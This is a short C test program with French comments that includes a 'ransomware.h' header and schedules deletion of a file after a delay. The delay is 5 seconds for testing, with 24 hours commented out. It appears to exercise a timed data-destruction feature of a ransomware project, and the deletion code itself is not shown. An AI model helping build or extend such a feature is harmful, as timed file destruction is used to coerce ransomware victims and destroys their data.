#include <stdio.h>
#include <windows.h> 
#include "ransomware.h"

// Ce fichier est à titre d'exemple d'utilisation de la fonctionnaliter de suppression apres 24 h, il disparraitra apres validation de la fonctionnalite

int main() {
    // Exemple d'appel de la fonction avec un fichier et un délai de 5 secondes
    const char *file_path = "./test";
    int wait_time_seconds = 5; // Délai de 5 secondes pour les tests
    // int wait_time_seconds = 24 * 60* 60; // Délai de 24 heures 
    printf("Programme lancé. Le fichier sera supprimé dans %d secondes.\n", wait_time_seconds); 
    // Appel de la fonction pour planifier la suppression du fichier
    scheduleFileDeletion(file_path, wait_time_seconds);

    // Boucle pour maintenir le programme actif et traiter les messages 
    printf("Le programme reste actif. Appuyez sur Ctrl+C pour quitter.\n");
    while (1) {
        printf("-- une seconde, ");
        SleepEx(1000, TRUE); // Attend 1 seconde tout en permettant l'exécution des callbacks
    }

    return 0;
}
